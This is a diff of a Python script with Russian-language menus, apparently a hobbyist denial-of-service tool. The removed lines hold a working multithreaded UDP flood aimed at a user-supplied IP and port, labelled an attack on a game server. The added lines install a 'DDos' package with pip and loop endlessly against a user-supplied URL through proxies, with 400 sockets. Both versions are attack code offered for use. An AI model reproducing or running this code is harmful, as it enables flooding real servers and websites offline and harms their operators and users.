@@ -54,36 +54,44 @@ print("""\033[31m
            \033[36mРазнеси всех и вся 💥
 """)
 time.sleep(2)
-import random
-import socket
-import threading
-
-print("")
-print("""     | BY. PH ~DHRUBO |   """)
-
-print("")
-print("""  
-         | SAMP SERVER - DDOS ATTACK | 
+import time
+def clear ():
+    print("\n" * 200)
+print("""
+<------------------------>
+| Создатель кода: 0xSn1kky
+| Версия: 1.0
+<------------------------>
 """)
-print("")
-ip = input(" IP : => ")
-port = input(" PORT : => ")
+print("Загрузка команд...")
+time.sleep(1)
+print("""
+    [Список команд]
+    1. /download - установка (Обязательно)
+    2. /start - начать DDos
+    3. /stop - выйти (не работает во время DDos атаки используйте Ctrl+Z)
+    """)
+command = input("Введите команду\n")
 
-def udpsirisakz():
-	data = random._urandom(1200)
-	thr = int(0)
-	while True:
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			s.sendto(data,addr)
-			for x in range(1):
-				s.sendto(data,addr)
-				thr += 1
-			print(f"| SERVER ATTACK | {ip}:{port} Time:120 >>", thr)
-		except:
-			thr -= 1
+if command == "/download":
+    import os
+    os.system("pip install DDos")
 
-for y in range(20):
-		th = threading.Thread(target = udpsirisakz)
-		th.start()
+if command == "/stop":
+    clear()
+    print("Пока")
+    exit(0)
+   
+if command == "/start":
+    try:
+            import DDos
+    except:
+        print("Вы не установили напишите /download")
+        exit(0)
+    print("Введите ссылку")
+    url = input("\n")
+    while True:
+      DDos.DDos(url, sockets = 400, threads = 10, use_proxies = True)
+       
+else:
+    print("Команда не найдена!")
